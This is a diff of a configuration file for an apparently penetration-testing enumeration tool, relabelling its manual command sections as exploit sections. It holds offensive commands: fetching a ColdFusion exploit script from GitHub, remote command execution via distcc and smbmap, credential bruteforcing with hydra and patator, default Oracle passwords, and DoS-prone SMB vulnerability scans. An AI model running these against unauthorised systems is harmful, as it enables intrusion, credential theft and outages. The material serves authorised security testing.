@@ -24,7 +24,7 @@ service-names = [
     '^fmtp',
     'cold fusion'
 ]
-    [[cold-fusion.manual]]
+    [[cold-fusion.exploit]]
     description = 'Potential IIS Cold Fusion Vulnerability!'
     commands = [
     "\twget https://github.com/TheRealHetfield/exploits/blob/master/coldfusion_fckeditor.py -O a5.py",
@@ -57,7 +57,7 @@ service-names = [
     name = 'nmap-distcc'
     command = 'nmap {nmap_extra} -sV -p {port} --script="banner,distcc-cve2004-2687" --script-args="distcc-cve2004-2687.cmd=id" -oN "{scandir}/{port}_distcc_nmap.txt" -oX "{scandir}/xml/{port}_distcc_nmap.xml" {address}'
 
-    [[distcc.manual]]
+    [[distcc.exploit]]
     description = 'Distcc Vulnerability Detected. Try To Run Command'
     commands = [
         '# Use the following to Exploit:',
@@ -96,7 +96,7 @@ service-names = [
     name = 'nmap-ftp'
     command = 'nmap {nmap_extra} -sV -p {port} --script="banner,(ftp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "{scandir}/{port}_ftp_nmap.txt" -oX "{scandir}/xml/{port}_ftp_nmap.xml" {address}'
 
-    [[ftp.manual]]
+    [[ftp.exploit]]
     description = 'Bruteforce logins:'
     commands = [
         'hydra -L "{username_wordlist}" -P "{password_wordlist}" -e nsr -s {port} -o "{scandir}/{port}_ftp_hydra.txt" ftp://{address}',
@@ -153,7 +153,7 @@ ignore-service-names = [
 
 
 
-    [[http.manual]]
+    [[http.exploit]]
     description = 'Use Dirb or Dirsearch to Search Directories of Interest'
     commands = [
         "Dirb is Simple and Works Well",
@@ -165,27 +165,27 @@ ignore-service-names = [
     ]
 
 
-    [[http.manual]]
+    [[http.exploit]]
     description = '(dirsearch) Multi-threaded recursive directory/file enumeration for web servers using various wordlists:'
     commands = [
         'dirsearch -u {scheme}://{address}:{port}/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/seclists/Discovery/Web-Content/big.txt --plain-text-report="{scandir}/{port}_{scheme}_dirsearch_big.txt"',
         'dirsearch -u {scheme}://{address}:{port}/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --plain-text-report="{scandir}/{port}_{scheme}_dirsearch_dirbuster.txt"'
     ]
 
-    [[http.manual]]
+    [[http.exploit]]
     description = '(dirb) Recursive directory/file enumeration for web servers using various wordlists (same as dirsearch above):'
     commands = [
         'dirb {scheme}://{address}:{port}/ /usr/share/seclists/Discovery/Web-Content/big.txt -l -r -S -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o "{scandir}/{port}_{scheme}_dirb_big.txt"',
         'dirb {scheme}://{address}:{port}/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -r -S -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o "{scandir}/{port}_{scheme}_dirb_dirbuster.txt"'
     ]
 
-    [[http.manual]]
+    [[http.exploit]]
     description = '(wpscan) WordPress Security Scanner (useful if WordPress is found):'
     commands = [
         'wpscan --url {scheme}://{address}:{port}/ --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee "{scandir}/{port}_{scheme}_wpscan.txt"'
     ]
 
-    [[http.manual]]
+    [[http.exploit]]
     description = "Credential bruteforcing commands (don't run these without modifying them):"
     commands = [
         'hydra -L "{username_wordlist}" -P "{password_wordlist}" -e nsr -s {port} -o "{scandir}/{port}_{scheme}_auth_hydra.txt" {scheme}-get://{address}/path/to/auth/area',
@@ -232,7 +232,7 @@ service-names = [
     ports.tcp = [139, 389, 445]
     ports.udp = [137]
 
-    [[ldap.manual]]
+    [[ldap.exploit]]
     description = 'ldapsearch command (modify before running)'
     commands = [
         'ldapsearch -x -D "<username>" -w "<password>"" -p {port} -h {address} -b "dc=example,dc=com" -s sub "(objectclass=*) 2>&1 | tee > "{scandir}/{port}_ldap_all-entries.txt"'
@@ -259,7 +259,7 @@ service-names = [
     name = 'nmap-mssql'
     command = 'nmap {nmap_extra} -sV -p {port} --script="banner,(ms-sql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="mssql.instance-port={port},mssql.username=sa,mssql.password=sa" -oN "{scandir}/{port}_mssql_nmap.txt" -oX "{scandir}/xml/{port}_mssql_nmap.xml" {address}'
 
-    [[mssql.manual]]
+    [[mssql.exploit]]
     description = '(sqsh) interactive database shell'
     commands = [
         'sqsh -U <username> -P <password> -S {address}:{port}'
@@ -326,13 +326,13 @@ service-names = [
     name = 'oracle-scanner'
     command = 'oscanner -v -s {address} -P {port} 2>&1 | tee "{scandir}/{port}_oracle_scanner.txt"'
 
-    [[oracle.manual]]
+    [[oracle.exploit]]
     description = 'Brute-force SIDs using Nmap'
     commands = [
         'nmap {nmap_extra} -sV -p {port} --script="banner,oracle-sid-brute" -oN "{scandir}/{port}_oracle_sid-brute_nmap.txt" -oX "{scandir}/xml/{port}_oracle_sid-brute_nmap.xml" {address}'
         ]
 
-    [[oracle.manual]]
+    [[oracle.exploit]]
     description = 'Install ODAT (https://github.com/quentinhardy/odat) and run the following commands:'
     commands = [
         'python odat.py tnscmd -s {address} -p {port} --ping',
@@ -343,7 +343,7 @@ service-names = [
         'python odat.py tnspoison -s {address} -p {port} -d <sid> --test-module'
     ]
 
-    [[oracle.manual]]
+    [[oracle.exploit]]
     description = 'More ODAT STUFF: Install ODAT'
     commands = [
         "\tInstall Odat:(https://github.com/quentinhardy/odat)",
@@ -371,7 +371,7 @@ service-names = [
         "\t\tSYSTEM:MANAGER, SCOTT:TIGER, SYS:CHANGE_ON_INSTALL, OUTLN:OUTLN, DBSNMP:DBSNMP, CTXSYS:CTXSYS, MDSYS:MDSYS"
     ]
 
-    [[oracle.manual]]
+    [[oracle.exploit]]
     description = 'Install Oracle Instant Client (https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux) and then bruteforce with patator:'
     commands = [
         'patator oracle_login host={address} port={port} user=COMBO00 password=COMBO01 0=/usr/share/seclists/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt -x ignore:code=ORA-01017 -x ignore:code=ORA-28000'
@@ -399,7 +399,7 @@ service-names = [
     name = 'nmap-rdp'
     command = 'nmap {nmap_extra} -sV -p {port} --script="banner,(rdp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "{scandir}/{port}_rdp_nmap.txt" -oX "{scandir}/xml/{port}_rdp_nmap.xml" {address}'
 
-    [[rdp.manual]]
+    [[rdp.exploit]]
     description = 'Bruteforce logins:'
     commands = [
         'hydra -L "{username_wordlist}" -P "{password_wordlist}" -e nsr -s {port} -o "{scandir}/{port}_rdp_hydra.txt" rdp://{address}',
@@ -429,7 +429,7 @@ service-names = [
     name = 'nmap-msrpc'
     command = 'nmap {nmap_extra} -sV -p {port} --script="banner,msrpc-enum,rpc-grind,rpcinfo" -oN "{scandir}/{port}_rpc_nmap.txt" -oX "{scandir}/xml/{port}_rpc_nmap.xml" {address}'
 
-    [[rpc.manual]]
+    [[rpc.exploit]]
     description = 'RPC Client:'
     commands = [
         'rpcclient -p {port} -U "" {address}'
@@ -459,7 +459,7 @@ service-names = [
     name = 'nmap-ssh'
     command = 'nmap {nmap_extra} -sV -p {port} --script="banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods" -oN "{scandir}/{port}_ssh_nmap.txt" -oX "{scandir}/xml/{port}_ssh_nmap.xml" {address}'
 
-    [[ssh.manual]]
+    [[ssh.exploit]]
     description = 'Bruteforce logins:'
     commands = [
         'hydra -L "{username_wordlist}" -P "{password_wordlist}" -e nsr -s {port} -o "{scandir}/{port}_ssh_hydra.txt" ssh://{address}',
@@ -517,13 +517,13 @@ service-names = [
     name = 'smbmap-execute-command-null-user'
     command = 'smbmap -u null -p "" -H {address} -P {port} -x "ipconfig /all" 2>&1 | tee "{scandir}/smbmap-execute-command-null-user.txt"'
 
-    [[smb.manual]]
+    [[smb.exploit]]
     description = 'Nmap scans for SMB vulnerabilities that could potentially cause a DoS if scanned (according to Nmap). Be careful:'
     commands = [
         'nmap {nmap_extra} -sV -p {port} --script="smb-vuln*" --script-args="unsafe=1" -oN "{scandir}/{port}_smb_vuln.txt" -oX "{scandir}/xml/{port}_smb_vuln.xml" {address}',
     ]
 
-    [[smb.manual]]
+    [[smb.exploit]]
     description = 'Browse SMB Files like an FTP:'
     commands = [
         'smbclient \\\\{address}\\share -U ""%""        #allows me to browse files, like an ftp',
